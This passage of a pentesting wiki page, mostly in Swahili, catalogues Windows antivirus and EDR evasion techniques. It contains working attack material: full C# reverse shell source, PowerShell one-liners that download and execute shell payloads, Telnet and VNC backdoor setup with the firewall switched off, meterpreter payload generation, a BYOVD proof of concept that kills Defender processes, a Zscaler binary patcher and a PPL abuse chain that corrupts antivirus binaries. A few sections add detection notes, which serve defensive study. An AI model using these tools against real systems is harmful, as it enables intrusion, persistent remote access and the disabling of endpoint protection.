<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) ni mfumo wenye nguvu wa logging katika Windows unaoruhusu programu na vipengele vya mfumo **kurekodi matukio**. Hata hivyo, pia unaweza kutumiwa na bidhaa za usalama kufuatilia na kugundua shughuli zenye madhara.

Kwa namna ile ile AMSI inavyozimwa (kuvukwa) pia inawezekana kufanya function ya **`EtwEventWrite`** ya user space process irudie mara moja bila kurekodi matukio yoyote. Hii hufanywa kwa kupatch function hiyo katika memory ili irudie mara moja, kwa ufanisi kuzima ETW logging kwa process hiyo.

You can find more info in **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Kupakia C# binaries katika memory kumejulikana kwa muda mrefu na bado ni njia nzuri ya kuendesha zana zako za post-exploitation bila kukamatwa na AV.

Kwa kuwa payload itapakiwa moja kwa moja kwenye memory bila kugusa disk, tutalazimika kuzingatia tu kupatch AMSI kwa process nzima.

Wengi wa C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) tayari wanatoa uwezo wa kutekeleza C# assemblies moja kwa moja katika memory, lakini kuna njia tofauti za kufanya hivyo:

- **Fork\&Run**

Inahusisha **kuanzisha process mpya ya sadaka (sacrificial process)**, kuingiza post-exploitation malicious code yako ndani ya process hiyo mpya, kutekeleza malicious code yako na baada ya kukamilika, kuua process mpya. Hii ina faida na hasara zake. Faida ya njia ya fork and run ni kwamba utekelezaji hufanyika **nje** ya Beacon implant process yetu. Hii inamaanisha kwamba ikiwa jambo fulani katika hatua yetu ya post-exploitation litashindikana au litagunduliwa, kuna **uwezekano mkubwa zaidi** wa **implant yetu kuishi.** Hasara ni kwamba una **uwezekano mkubwa** wa kugunduliwa na **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Inahusu kuingiza post-exploitation malicious code **ndani ya process yake mwenyewe**. Kwa njia hii, unaweza kuepuka kuunda process mpya na kuipata ikiskaniwa na AV, lakini hasara ni kwamba ikiwa kitu kitakachosababisha hitilafu wakati wa utekelezaji wa payload yako, kuna **uwezekano mkubwa zaidi** wa **kupoteza beacon yako** kwani inaweza kuanguka.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ikiwa unataka kusoma zaidi kuhusu kupakia C# Assembly, tafadhali angalia makala hii [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) na InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Unaweza pia kupakia C# Assemblies **from PowerShell**, angalia [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) na video ya S3cur3th1sSh1t ([https://www.youtube.com/watch?v=oe11Q-3Akuk](https://www.youtube.com/watch?v=oe11Q-3Akuk)).

## Using Other Programming Languages

Kama ilivyopendekezwa katika [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), inawezekana kutekeleza malicious code kwa kutumia lugha nyingine kwa kumpa mashine iliyokumbwa ufikiaji **to the interpreter environment installed on the Attacker Controlled SMB share**.

Kwa kuruhusu ufikiaji wa Interpreter Binaries na mazingira kwenye SMB share unaweza **execute arbitrary code in these languages within memory** ya mashine iliyokumbwa.

The repo indicates: Defender bado inaskana scripts lakini kwa kutumia Go, Java, PHP n.k. tuna **more flexibility to bypass static signatures**. Testing na random un-obfuscated reverse shell scripts katika lugha hizi imeonyesha mafanikio.

## TokenStomping

Token stomping ni teknik inayomruhusu mshambuliaji **manipulate the access token or a security prouct like an EDR or AV**, kuwaondoa privileges ili process haijaangamizwa lakini haitakuwa na ruhusa za kuchunguza shughuli zenye hatari.

Ili kuzuia hili Windows inaweza **prevent external processes** kutoka kupata handles juu ya tokens za security processes.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Kama ilivyoelezwa katika [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), ni rahisi tu kusakinisha Chrome Remote Desktop kwenye PC ya mwathirika kisha kuutumia kuuuwa na kudumisha persistence:
1. Download from https://remotedesktop.google.com/, click on "Set up via SSH", and then click on the MSI file for Windows to download the MSI file.
2. Run the installer silently in the victim (admin required): `msiexec /i chromeremotedesktophost.msi /qn`
3. Go back to the Chrome Remote Desktop page and click next. The wizard will then ask you to authorize; click the Authorize button to continue.
4. Execute the given parameter with some adjustments: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Kumbuka param ya pin inayoruhusu kuweka pin bila kutumia GUI).


## Advanced Evasion

Evasion ni mada yenye ugumu mkubwa, wakati mwingine lazima uzingatie vyanzo vingi tofauti vya telemetry katika mfumo mmoja, hivyo ni karibu haiwezekani kubaki bila kugunduliwa kabisa katika mazingira yaliyoendelea.

Kila mazingira utakayoshambulia yatakuwa na nguvu na udhaifu wake.

Ninakuhimiza sana uangalie mazungumzo haya kutoka kwa [@ATTL4S](https://twitter.com/DaniLJ94), ili kupata msingi wa mbinu zaidi za Advanced Evasion techniques.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Hii pia ni mazungumzo mazuri kutoka kwa [@mariuszbit](https://twitter.com/mariuszbit) kuhusu Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Unaweza kutumia [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) ambayo ita **ondoa sehemu za binary** hadi itakapogundua ni **sehemu gani Defender** inaiona kama malicious na kukugawa.\
Chombo kingine kinachofanya **kitu sawa ni** [**avred**](https://github.com/dobin/avred) ambayo inatoa huduma hiyo kupitia tovuti ya wazi [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Hadi Windows10, Windows zote zilikuja na **Telnet server** ambayo unaweza kuisakinisha (kama administrator) ukifanya:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Ifanye **ianze** wakati mfumo unapoanza na **endeshe** sasa:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Badilisha telnet port** (stealth) na uzime firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Pakua kutoka: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (unataka bin downloads, si setup)

**KWENYE HOST**: Endesha _**winvnc.exe**_ na usanidi seva:

- Washa chaguo _Disable TrayIcon_
- Weka nenosiri katika _VNC Password_
- Weka nenosiri katika _View-Only Password_

Kisha, hamisha binary _**winvnc.exe**_ na faili **mpya** iliyotengenezwa _**UltraVNC.ini**_ ndani ya **victim**

#### **Reverse connection**

**attacker** anapaswa **endesha ndani ya** **host** binary `vncviewer.exe -listen 5900` ili iwe **tayari** kunasa reverse **VNC connection**. Kisha, ndani ya **victim**: Anza daemon ya winvnc `winvnc.exe -run` na endesha `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**ONYO:** Ili kudumisha usiri usifanye mambo yafuatayo

- Usianze `winvnc` ikiwa tayari inaendesha au utaamsha [popup](https://i.imgur.com/1SROTTl.png). Angalia kama inaendesha kwa `tasklist | findstr winvnc`
- Usianze `winvnc` bila `UltraVNC.ini` katika sarasili hiyo hiyo au itasababisha [the config window](https://i.imgur.com/rfMQWcf.png) kufunguka
- Usifanye `winvnc -h` kwa msaada au utaamsha [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Pakua kutoka: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Ndani ya GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Sasa **anzisha lister** kwa kutumia `msfconsole -r file.rc` na **utekeleze** **xml payload** kwa:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Defender wa sasa ataisha mchakato haraka sana.**

### Ku-compile reverse shell yetu

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### C# reverse shell ya kwanza

Ita-compile kwa:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Tumia pamoja na:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# kwa kutumia kompaila
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Kupakua na kutekeleza kwa otomatiki:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Orodha ya obfuscators za C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Mfano wa kutumia python kujenga injectors:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Zana nyingine
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Zaidi

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Kuua AV/EDR kutoka Kernel Space

Storm-2603 ilitumia utiliti ndogo ya console inayojulikana kama **Antivirus Terminator** kuzima ulinzi wa endpoint kabla ya kupeleka ransomware. Zana hiyo inaleta **own vulnerable but *signed* driver** na kuitumia kutoa shughuli za kernel zenye vigezo vya juu ambazo hata huduma za AV za Protected-Process-Light (PPL) haziwezi kuzuia.

Vidokezo muhimu
1. **Signed driver**: Faili iliyowekwa kwenye disk ni `ServiceMouse.sys`, lakini binary ni driver halali iliyo na saini `AToolsKrnl64.sys` kutoka Antiy Labs’ “System In-Depth Analysis Toolkit”. Kwa sababu driver ina saini halali ya Microsoft, inaload hata wakati Driver-Signature-Enforcement (DSE) imewezeshwa.
2. Ufungaji wa service:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Mstari wa kwanza unasajili driver kama **kernel service** na wa pili unaanza ili `\\.\ServiceMouse` iweze kupatikana kutoka user land.
3. IOCTLs zinazofichuliwa na driver
| IOCTL code | Uwezo                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Kuua mchakato wowote kwa PID (kutumika kuua huduma za Defender/EDR) |
| `0x990000D0` | Futa faili yoyote kwenye disk |
| `0x990001D0` | Unload the driver and remove the service |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. Kwa nini inafanya kazi: BYOVD inapuuza ulinzi wa user-mode kabisa; code inayotekelezwa kwenye kernel inaweza kufungua *protected* processes, kuziua, au kuingilia vitu vya kernel bila kujali PPL/PP, ELAM au vipengele vingine vya hardening.

Uchunguzi / Uzuiaji
•  Washa orodha ya kuzuia madereva yenye udhaifu ya Microsoft (`HVCI`, `Smart App Control`) ili Windows ikatae kupakia `AToolsKrnl64.sys`.  
•  Fuatilia uundaji wa huduma mpya za *kernel* na toa tahadhari wakati driver inapopakuliwa kutoka directory inayoweza kuandikwa na wote au haipo kwenye allow-list.  
•  Angalia handles za user-mode kwa custom device objects zinazoambatana na simu za hatari za `DeviceIoControl`.

### Kupitisha Zscaler Client Connector Posture Checks kupitia On-Disk Binary Patching

Zscaler’s **Client Connector** inatekeleza sheria za device-posture kwa upande wa mteja na inategemea Windows RPC kuwasilisha matokeo kwa vipengele vingine. Machaguo mawili ya kubuni yaliyo dhaifu yanafanya bypass kamili iwezekane:

1. Tathmini ya posture hufanywa **entirely client-side** (boolean hutumwa kwa server).  
2. Internal RPC endpoints zinathibitisha tu kwamba executable inayounganisha ime **signed by Zscaler** (kwa `WinVerifyTrust`).

Kwa **kufanya patching kwa binaries nne zilizotiwa saini kwenye disk** mbinu zote mbili zinaweza kuzimwa:

| Binary | Mantiki ya asili iliyopatchiwa | Matokeo |
|--------|-------------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Inarudisha kila wakati `1` hivyo kila ukaguzi unaonekana kuwa compliant |
| `ZSAService.exe` | Indirect call to `WinVerifyTrust` | NOP-ed ⇒ any (even unsigned) process can bind to the RPC pipes |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Replaced by `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integrity checks on the tunnel | Imekatizwa |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Baada ya kubadilisha faili za asili na kuwasha upya service stack:

* **Kila** ukaguzi wa postura unaonyesha **kijani/zinakubaliana**.
* Binaries zisizotiwa saini au zilizorekebishwa zinaweza kufungua miisho ya RPC ya named-pipe (e.g. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Mashine iliyodukuliwa hupata ufikiaji usiozuiliwa kwa mtandao wa ndani ulioainishwa na sera za Zscaler.

Uchunguzi huu wa kesi unaonyesha jinsi maamuzi ya uaminifu yanayofanywa upande wa mteja na ukaguzi rahisi wa saini yanaweza kushindwa kwa byte patches chache.

## Kutumia vibaya Protected Process Light (PPL) To Tamper AV/EDR With LOLBINs

Protected Process Light (PPL) inatekeleza hierarkia ya mtoa saini/kiwango ili tu michakato iliyolindwa yenye kiwango sawa au cha juu iweze kuathiri kila mmoja. Kwa upande wa shambulio, ikiwa unaweza kuzindua kisheria binary iliyojengwa kwa PPL na kudhibiti hoja zake, unaweza kubadilisha utendaji salama (mfano, logging) kuwa primitive ya kuandika inayodhibitiwa, inayotegemewa na PPL dhidi ya saraka zilizolindwa zinazotumika na AV/EDR.

Nini kinachofanya mchakato uendeshwe kama PPL
- EXE lengwa (na DLL yoyote iliyopakiwa) lazima itwe saini na EKU inayofaa kwa PPL.
- Mchakato lazima uundwe kwa CreateProcess ukitumia flag: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Lazima uombewe kiwango cha ulinzi kinachofanana na mtoa saini wa binary (mfano, `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` kwa mtoa saini wa anti-malware, `PROTECTION_LEVEL_WINDOWS` kwa mtoa saini wa Windows). Viwango visivyofaa vitaanguka wakati wa uundaji.

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (huchagua kiwango cha ulinzi na hupitisha hoja kwa EXE lengwa):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Mfano wa matumizi:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- The signed system binary `C:\Windows\System32\ClipUp.exe` self-spawns and accepts a parameter to write a log file to a caller-specified path.
- When launched as a PPL process, the file write occurs with PPL backing.
- ClipUp cannot parse paths containing spaces; use 8.3 short paths to point into normally protected locations.

8.3 short path helpers
- List short names: `dir /x` in each parent directory.
- Derive short path in cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Launch the PPL-capable LOLBIN (ClipUp) with `CREATE_PROTECTED_PROCESS` using a launcher (e.g., CreateProcessAsPPL).
2) Pass the ClipUp log-path argument to force a file creation in a protected AV directory (e.g., Defender Platform). Use 8.3 short names if needed.
3) If the target binary is normally open/locked by the AV while running (e.g., MsMpEng.exe), schedule the write at boot before the AV starts by installing an auto-start service that reliably runs earlier. Validate boot ordering with Process Monitor (boot logging).
4) On reboot the PPL-backed write happens before the AV locks its binaries, corrupting the target file and preventing startup.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Vidokezo na vikwazo
- Huwezi kudhibiti yaliyomo ambayo ClipUp huandika zaidi ya mpangilio; primitive hii inafaa zaidi kwa uharibifu badala ya kuingiza yaliyomo kwa umakini.
- Inahitaji local admin/SYSTEM kusanidi kuanzisha service na dirisha la kuanzisha upya.
- Muda ni muhimu: lengo halipaswi kuwa wazi; utekelezaji wakati wa boot unazuia locks za faili.

Utambuzi
- Uundaji wa mchakato wa `ClipUp.exe` na hoja zisizo za kawaida, hasa ukiwa umezaliwa na non-standard launchers, karibu na boot.
- New services zilizosetishwa kuanzisha moja kwa moja suspicious binaries na kuanza mara kwa mara kabla ya Defender/AV. Chunguza uundaji/urekebishaji wa service kabla ya kushindwa kuanza kwa Defender.
- File integrity monitoring kwenye Defender binaries/Platform directories; uundaji/urekebishaji wa faili zisizotarajiwa na michakato yenye protected-process flags.
- ETW/EDR telemetry: tazama michakato iliyoundwa kwa `CREATE_PROTECTED_PROCESS` na matumizi isiyo ya kawaida ya viwango vya PPL na non-AV binaries.

Kupunguza hatari
- WDAC/Code Integrity: zuia ni signed binaries zipi zinaweza kukimbia kama PPL na chini ya wazazi gani; zuii ClipUp invocation nje ya muktadha halali.
- Service hygiene: zuia uundaji/urekebishaji wa auto-start services na fuatilia start-order manipulation.
- Hakikisha Defender tamper protection na early-launch protections zimeshawashwa; chunguza makosa ya kuanzisha yanayoashiria binary corruption.
- Fikiria kuzima 8.3 short-name generation kwenye volumes zinazohifadhi security tooling ikiwa inafaa kwa mazingira yako (jaribu kwa kina).

References for PPL and tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## References

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)

- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)

{{#include ../banners/hacktricks-training.md}}
